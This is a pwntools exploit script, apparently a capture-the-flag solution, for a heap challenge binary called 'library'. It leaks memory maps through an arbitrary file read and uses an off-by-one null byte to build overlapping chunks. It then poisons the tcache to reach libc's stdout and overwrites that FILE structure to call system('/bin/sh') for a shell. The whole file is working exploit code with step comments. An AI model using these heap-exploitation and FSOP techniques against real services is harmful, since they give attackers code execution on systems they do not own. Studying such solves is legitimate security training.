#!/usr/bin/env python3

from pwn import *

exe = ELF("./library_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["kitty", "--detach", "bash", "-c"]
#context.terminal = ["kitty", "@", "new-window"]
# spawn new window
context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "splitw", "-h"]

context.log_level = "info"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """

"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

def order(name=b"A"):
    r.sendlineafter(b"choice:", b"1")
    r.recvuntil(b"id: ")
    bid = int(r.recvline().strip())
    r.sendafter(b"name:", name)
    return bid

def read(bid):
    r.sendlineafter(b"choice:", b"2")
    r.sendlineafter(b"id:", str(bid).encode())
    r.recvuntil(b"incoming!\n")
    return r.recvuntil(b"\nhope you enjoyed", drop=True)

def add(bid, sz, data=b"A"):
    r.sendlineafter(b"choice:", b"3")
    r.sendlineafter(b"id:", str(bid).encode())
    r.sendlineafter(b"length:", str(sz).encode())
    r.sendafter(b"review:", data)

def free(bid):
    r.sendlineafter(b"choice:", b"3")
    r.sendlineafter(b"id:", str(bid).encode())
    r.sendlineafter(b"[Y/n]", b"y")

def mangle(ptr, pos):
    return ptr ^ (pos >> 12)




def main():
    # r.interactive()
    r.sendlineafter(b'choice:', b'4')
    r.sendlineafter(b"[Y/n]", b'n')
    r.sendlineafter(b"[Y/n]", b'y')
    r.sendlineafter(b"length:", str(0x18).encode()) 
    r.sendlineafter(b"card:", p64(0) + p64(0x1a1)) # use the arb sendfile to leak proc self maps
    r.sendlineafter(b"[Y/n]", b"n")
    leak = order(b"/proc/self/maps")
    print(leak)
    exe.address = int(read(leak), 16)
    aleak("elf base:", exe.address)
    
    # r.interactive()
    r.sendlineafter(b"choice:", b'4')
    r.sendlineafter(b"[Y/n]", b"y")
    log.info("addr: ", hex(exe.address+0x4250))
    pause()
    r.sendafter(b"bio:", p64(exe.address+0x4250)*2)
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"n")
    p0 = order()
    b0 = order()
    b1 = order()
    b2 = order()
    add(b0, 0x38) # 0x38 + 1 byte (off by one) = 0x40, il byte va sui metadati del prossimo chunk 
    add(b1, 0x4f8) # victim chunk, will be corrupted. 0x4f8 + 1 byte = 0x500 -> goes in unsortedbin when freed
    add(b2, 0x68) # guard chunk to prevent consolidation with top chunk once b1 is freed -> i just need a small size to put it into the tcache
    free(b0)
    add(b0, 0x38, b"A"*0x30+p64(0x1a0)) # write 0x1a0 in prev_size of b1, 0 will be
    # written in the prev_inuse byte of the chunk b1 (it will seem already free)
    log.info("before merging")
    pause()
    free(b1) # reads the fake size and merges b1 with the prev 0x1a0 memory size on the heap -> will contain the prev variables (example: settings variable!)
    log.info("after merging")
    add(p0, 0x190, p64(0)*3+p16(0xffff)) # put 0 = padding
    # write comprehension, now i can fully read proc/self/maps
    
    pause()
    # leak heap + libc 
    r.sendlineafter(b"choice:", b"4")
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"y")
    data = read(leak)
    # print(data)
    # r.interactive()
    heap = int(data.split(b"\n")[5].split(b"-")[0], 16)
    log.info(f"{hex(heap)=}")
    libc.address = int(data.split(b"\n")[7].split(b"-")[0], 16)
    log.info(f"{hex(libc.address)=}")



    # FSOP?
    b0 = order() # realloc b0 = corrupted chunk
    add(b0, 0x448) 
    fake = order()
    v0 = order()
    v1 = order()
    v2 = order()
    attacker = order()
    victim = order()
    guard = order()
    log.info("before fsop exploit")
    aleak("heap", heap)
    pause()

    # heap + offset trovato con:
    #  search -t qword 0x291

    payload = p64(0) + p64(0x291) + p64(heap + 0xb10) * 2 # prev chunk not in use, size, heap + 0xb10 = fake addr bk/fd (where fake will be stored)
    add(fake, 0x48, payload) # set the chunk, its bk and fd will point to itself and safe unlinking will think it's a circular list
    log.info("after add 0x48")
    pause()
    add(v0, 0x100)
    add(v1, 0x100)
    add(attacker, 0x28)
    add(victim, 0x4f8)
    add(guard, 0x28)
    free(attacker)
    add(attacker, 0x28, b'A' * 0x20 + p64(0x290)) # off by one null byte will set victim's prev_inuse to 0
    free(v1) # goes in tcache
    free(v0) # goes in tcache
    log.info("before freeing victim")
    pause()
    free(victim) # prev_inuse is 0, will require a giga size and overlap 0x290 bytes -> overlaps with v1 and v0 and v2 -> i can overwrite a chunk both in the tcache and and freed in the unsortedbin
    log.info("after overlapping tcache chunks v0 and v1")
    pause()

    # add v2, padding to go to v0, overwrite v0's size with the same size as before: 0x111 (= 0x100 + 0x11) and fd with io stdout
    add(v2, 0x60, p64(0)*7+p64(0x111)+p64(mangle(libc.sym._IO_2_1_stdout_, heap+0xba0)))
    c0 = order() 
    c1 = order() 
    add(c0, 0x100) # allocs v0!!! now io stdout is on top of the tcache

    log.info("before vtable corruption")
    pause()
    fake_vtable = libc.sym._IO_wfile_jumps-0x18
    stdout = libc.sym._IO_2_1_stdout_
    stdout_lock = libc.address+0x205710 # readelf -s libc.so.6 | grep _IO_stdfile_1_lock
    gadget = libc.address+0x1724f0
    fs = FileStructure(0)
    fs.flags = 0x3b01010101010101
    fs._IO_read_end = libc.sym.system
    fs._IO_save_base = gadget
    fs._IO_write_end = u64(b"/bin/sh\x00")
    fs._lock = stdout_lock
    fs._codecvt = stdout+0xb8
    fs._wide_data = libc.sym._IO_wide_data_1
    fs.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
    add(c1, 0x100, bytes(fs)) # malloc will return io stdout, and the payload will overwrite the file structure 

    r.interactive()


if __name__ == "__main__":
    main()
